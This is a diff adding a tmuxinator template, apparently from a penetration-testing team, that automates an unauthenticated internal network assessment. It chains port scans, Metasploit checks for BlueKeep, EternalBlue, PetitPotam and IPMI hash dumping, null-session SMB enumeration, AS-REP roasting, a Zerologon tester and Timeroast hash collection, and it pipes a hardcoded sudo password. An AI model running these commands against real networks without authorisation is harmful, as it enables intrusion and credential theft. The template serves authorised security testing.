@@ -1,0 +1,109 @@
+name: unauthd
+root: /RSM/
+
+# Note:
+#   - add printnightmare
+#   - there is a `cat` before certain commands to verify if there is a need to conduct the scans (i.e., if the necessary open ports were found)
+#
+
+# Variables/Defaults are set here
+<%
+  @settings["prefill"] ||= "python3 /RSM/newNomad/prefillTest.py"
+  @settings["domain"] ||= "domain.local"
+  @settings["nomadPass"] ||= "nomadPass"
+  @settings["workspace"] ||= "default"
+    #this must be unique to avoid potential conflict with prior testers msf workspaces - typically this uses the same string as the "client" variable set on entry
+  @settings["rootDir"] ||= "/RSM"
+  ### example of starting project with arguments: tmuxinator start internalTemplate domain=rsmus.local user=Sally pass="s8g9h3J##"
+%>
+
+# create and cd into client/testing folder before running
+windows:
+  - scanning: 
+      panes:
+        - masscan:
+          - printf '\033]2;%s\033\\' 'masscan'
+          - cd <%= @settings["rootDir"] %>/scans/Lists
+        - nmap top5000 tcp:
+          - printf '\033]2;%s\033\\' 'nmap top5000 tcp'
+          - echo <%= @settings["nomadPass"] %> | sudo -S su
+          - <%= @settings["prefill"] %> "sudo nmap -sC -sV -T4 -sS -vvv --top-ports 5000 -iL <%= @settings["rootDir"] %>/ipList.txt -oA <%= @settings["rootDir"] %>/scans/top5000-tcp"; clear
+        - nmap top500 udp:
+          - printf '\033]2;%s\033\\' 'nmap top500 udp'
+          - echo <%= @settings["nomadPass"] %> | sudo -S su
+          - <%= @settings["prefill"] %> "sudo nmap -sC sV -T4 -sU -vvv --top-ports 500 -iL <%= @settings["rootDir"] %>/ipList.txt -oA <%= @settings["rootDir"] %>/scans/top500-udp"; clear
+        - nmap all tcp ports after 5000:
+          - printf '\033]2;%s\033\\' 'nmap all tcp ports after 5000'
+          - nmap -oG - -v --top-ports 5000 | awk -F'[);]' '/Ports/{print $2}' > <%= @settings["rootDir"] %>/top-5000-ports.txt
+          - echo <%= @settings["nomadPass"] %> | sudo -S su
+          - <%= @settings["prefill"] %> "sudo nmap -sC -sV -T4 -O -sS -vvv -p- -iL <%= @settings["rootDir"] %>/ipList.txt  --exclude-ports $(cat <%= @settings["rootDir"] %>/top-5000-ports.txt) -oA <%= @settings["rootDir"] %>/scans/all-tcp-after-5000"; clear
+  - services: 
+      panes:
+        - dns:
+          - printf '\033]2;%s\033\\' 'dnsrecon'
+          - dnsrecon -d <%= @settings["domain"] %> -t axfr
+        - ftp:
+          - printf '\033]2;%s\033\\' 'ftp'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/p21.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use auxiliary/scanner/ftp/anonymous; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/p21.lst; run"
+        - snmp:
+          - printf '\033]2;%s\033\\' 'snmp'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/snmp.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use auxiliary/scanner/snmp/snmp_login; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/snmp.lst; run"
+        - IPMI Cipher Zero:
+          - printf '\033]2;%s\033\\' 'IPMI Cipher Zero'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/p623.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file://<%= @settings["rootDir"] %>/scans/Lists/p623.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_version.txt>; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/p623.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS file://<%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt>; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/p623.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file://<%= @settings["rootDir"] %>/scans/ipmi_cipher_zero.txt>; run; spool off; exit'
+          - wc -l <%= @settings["rootDir"] %>/scans/ipmi*
+        - printers:
+          - printf '\033]2;%s\033\\' 'printers'
+          - msfconsole -q -x "workspace -a <%= @settings['workspace'] %>; services -u -S 'print jet lasetjet'"
+  - SMB/nullSesh: 
+      panes:
+        - cme:
+          - printf '\033]2;%s\033\\' 'cme'
+          - mkdir <%= @settings["rootDir"] %>/scans/smb; cd <%= @settings["rootDir"] %>/scans/smb
+          - cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst && crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst -u '' -p '' | tee ./cme.txt &&  cat cme.txt | grep -ia 'signing:false' | awk '{print $2}' | tee ./smb_signing_not_required.txt && cat cme.txt | grep -ia 'smbv1:true' | awk '{print $2}' | tee ./smbv1_enabled.txt && cat cme.txt | grep -ia 'Windows' | grep -av -E 'Windows 8|Windows 1|Build 9600|Server 201|Server 202' | awk '{print $2 " - " $6 " " $7 " " $8 " " $9}' | tee ./unsupported.txt && cat cme.txt | grep -a '+' | tee ./smb_null_logon.txt && clear && for i in smb_null_logon.txt smb_signing_not_required.txt smbv1_enabled.txt unsupported.txt; do echo $i; cat $i; done && wc -l *
+        - enum4linux:
+          - printf '\033]2;%s\033\\' 'enum4linux'
+          - echo "DC null sessions check:"
+          - for i in $(cat <%= @settings["rootDir"] %>/dcIP.txt); do enum4linux $i; done | tee enum4linux-DC.txt
+          - echo "SMB check:"
+          - for i in $(cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst); do echo ""; echo "Testing:$i"; enum4linux -a $i | tee enum4linux-$i.txt; done
+  - ASREProast: 
+      panes:
+        - ASREP roast:
+          - printf '\033]2;%s\033\\' 'ASREP roast'
+          - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
+  - coercAuth: 
+      panes:
+        - coercAuth:
+          - printf '\033]2;%s\033\\' 'coercAuth'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use scanner/dcerpc/petitpotam; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/smb.lst; run"
+  - bigName: 
+      panes:
+        - zerologon:
+          - printf '\033]2;%s\033\\' 'zerologon'
+          - <%= @settings["prefill"] %> 'zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)'; clear; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
+        - blueKeep:
+          - printf '\033]2;%s\033\\' 'eternalBlue'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/kerberos.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use scanner/rdp/cve_2019_0708_bluekeep; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/kerberos.lst; run; exit"; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
+        - eternalBlue:
+          - printf '\033]2;%s\033\\' 'eternalBlue'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use scanner/smb/smb_ms17_010; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/smb.lst; run; exit"; echo -e "\e[0;31mAVOID RUNNING ON CRITICAL SYSTEMS\033[0m"
+  - ldapSigning: 
+      panes:
+        - ldapSigning:
+          - printf '\033]2;%s\033\\' 'ldapSigning'
+          - cd /opt/nomad-tools 
+          - git clone https://github.com/zyn3rgy/LdapRelayScan.git 
+          - cd LdapRelayScan && pipenv install && mkdir -p <%= @settings["rootDir"] %>/ldap; clear
+          - pipenv run python3 LdapRelayScan.py -method LDAPS -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/ldap/ldapSigning.txt
+  - timeroast: 
+      panes:
+        - timeroast:
+          - printf '\033]2;%s\033\\' 'timeroast'
+          - cd /opt/nomad-tools 
+          - git clone https://github.com/SecuraBV/Timeroast.git 
+          - cd /opt/nomad-tools/Timeroast && mkdir -p <%= @settings["rootDir"] %>/ldap
+          - echo <%= @settings["nomadPass"] %> | sudo -S su; clear
+          - sudo python3 timeroast.py $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/ldap/ntp-hashes.txt
